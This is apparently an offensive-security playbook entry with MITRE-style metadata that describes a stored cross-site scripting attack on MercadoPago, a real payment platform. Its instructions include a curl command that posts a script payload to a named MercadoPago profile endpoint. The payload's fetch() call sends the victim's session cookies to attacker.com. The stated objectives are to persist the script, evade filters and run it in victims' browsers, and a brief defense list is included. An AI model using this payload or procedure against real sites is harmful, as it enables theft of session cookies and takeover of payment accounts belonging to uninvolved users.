---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.365Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 57746a80-d34c-4117-a0bc-b3f0b63d3536
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-MercadoPago

## Summary

This procedure demonstrates how to exploit insufficient input sanitization in MercadoPago's web forms to inject and store a malicious JavaScript payload, which persists in the database and executes when viewed by users.

## Description

In the context of mercadopago.com.ar, a stored XSS vulnerability arises from failing to sanitize or encode user inputs in features like user profiles or comments. Attackers can submit HTML/JavaScript via POST requests to endpoints that store data without validation. Once stored, any user viewing the content triggers the script in their browser, enabling attacks like cookie theft or keylogging. Prerequisites include a registered account and tools for request manipulation.

## Requirements

1. Valid MercadoPago user account
2. Network access to mercadopago.com.ar
3. Burp Suite or similar proxy for intercepting requests

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using libraries like DOMPurify)
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript in stored data via WAF logs

## Objectives

1. Persist malicious script in application storage
2. Ensure payload evades basic filters
3. Prepare for execution in victim sessions

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate a form that stores user input, such as a profile update or comment submission on mercadopago.com.ar.

Navigate to the form and prepare to intercept the submission using [[tools/Burp-Suite]].

### Step 2: Craft and Inject Payload

**Context**: Modify the request to include an XSS payload in the input field.

**Command** ([[commands/curl-inject-xss]]):
```bash
curl -X POST https://mercadopago.com.ar/api/profile/update \
  -H "Cookie: session=your_session" \
  -H "Content-Type: application/json" \
  -d '{"description": "<script>fetch(\"https://attacker.com/steal?data=\"+encodeURIComponent(document.cookie));</script>"}'
```

> This command simulates posting a payload to a profile update endpoint. Replace with actual endpoint from reconnaissance. Expected output: HTTP 200 with confirmation of update, no sanitization errors.

### Step 3: Verify Storage

**Context**: Check if the payload is stored by retrieving the updated content.

Use a GET request or view the page to confirm the script is reflected without encoding.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[stored-xss]]
